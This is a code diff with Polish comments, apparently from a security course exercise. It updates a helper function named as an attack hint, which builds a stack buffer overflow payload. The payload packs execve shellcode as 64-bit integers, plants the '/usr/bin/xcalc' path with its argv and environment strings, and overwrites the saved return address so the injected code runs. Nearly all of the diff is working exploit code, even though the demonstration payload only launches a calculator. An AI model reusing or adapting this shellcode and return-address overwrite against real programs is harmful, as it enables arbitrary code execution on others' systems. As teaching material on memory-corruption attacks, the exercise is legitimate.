@@ -85,27 +85,35 @@ void zamien_bajt_pamieci_zmieniajac_uprawnienia(long long adres, char wartosc) {
 }
 
 void podpowiedz_do_ataku(void* adr) {
-
 	long long res[30] = {0};
-	char str[30] = "/usr/bin/nyancat";
+	char str[50] = "/usr/bin/xcalc\0xcalc\0DISPLAY=:0\0"; // pozycje 0, 15, 21
 	long long *tab = (long long*) str;
 
-	// Te trzy komórki zawierają adres do programu `nyancat`
+	// Te komórki zawierają adres do programu `xcalc`
 	res[12] = tab[0];
 	res[13] = tab[1];
 	res[14] = tab[2];
+	res[15] = tab[3];
 
 	// Te komórki wpisują na stos fragment kodu, który ma go uruchomić :)
 	res[16] = 5188146771733301064;
-	res[17] = 218559211125901;
-	res[18] = 836567040000;
-	res[19] = 2166217130385936128;
-	res[20] = -4286503217161615110;
+	res[17] = 5198408020041940109;
+	res[18] = -4394088990188991160;
+	res[19] = -1404198419726077184;
+	res[20] = 214442424092680;
+
+	// argumenty syscall
+	res[21] = adres_na_liczbe(adr) + 12 * 8 + 15;
+	res[22] = 0;
+
+	// evvironment do syscall
+	res[23] = adres_na_liczbe(adr) + 12 * 8 + 21;
+	res[24] = 0;
 
 	// Adres powrotu ustawiamy na stworzony przez nas powyżej kod
-	res[11] = adres_na_liczbe(adr) + 128;
+	res[11] = adres_na_liczbe(adr) + 16 * 8;
 
-	int n = 21;
+	int n = 25;
 	cout << "Podaj dane: " << '\n';
 	cout << n << '\n';
 	for(int i = 0; i < n; i++)
